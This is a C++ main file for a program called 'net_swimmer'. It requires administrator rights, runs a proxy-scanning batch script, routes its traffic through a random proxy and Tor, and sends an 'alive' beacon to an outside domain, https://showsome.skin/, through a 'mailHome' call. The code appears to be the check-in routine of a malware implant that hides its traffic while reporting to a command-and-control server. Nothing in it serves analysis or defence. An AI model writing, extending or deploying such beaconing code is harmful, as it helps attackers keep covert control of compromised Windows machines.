
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <windows.h>
#include "proxy_loader.h"
#include "mail_home.h"
#include "tor_launcher.h"
#include "util.h"

int main() {
    std::cout << "[net_swimmer] 🚀 Starting up...\n";

    if (!isAdmin()) {
        std::cerr << "[!] Must be run as administrator.\n";
        return 1;
    }

    std::cout << "[net_swimmer] ✅ Running as admin.\n";

    system("scripts\\run_proxy_scan.bat");

    std::vector<std::string> proxies = loadProxies("data/working_proxies.txt");
    if (proxies.empty()) {
        std::cerr << "[!] No proxies found. Aborting.\n";
        return 1;
    }

    std::string chosenProxy = proxies[rand() % proxies.size()];
    std::cout << "[net_swimmer] 🌐 Using proxy: " << chosenProxy << "\n";

    if (!startTorWithProxy(chosenProxy)) {
        std::cerr << "[!] Failed to start TOR with proxy. Aborting.\n";
        return 1;
    }

    std::string report = R"({"status":"alive","agent":"net_swimmer","time":")" + currentDateTime() + R"("})";
    bool success = mailHome("https://showsome.skin/", report);

    if (success) {
        std::cout << "[net_swimmer] ✅ Successfully mailed home!\n";
    } else {
        std::cerr << "[net_swimmer] ❌ Failed to mail home.\n";
    }

    return 0;
}
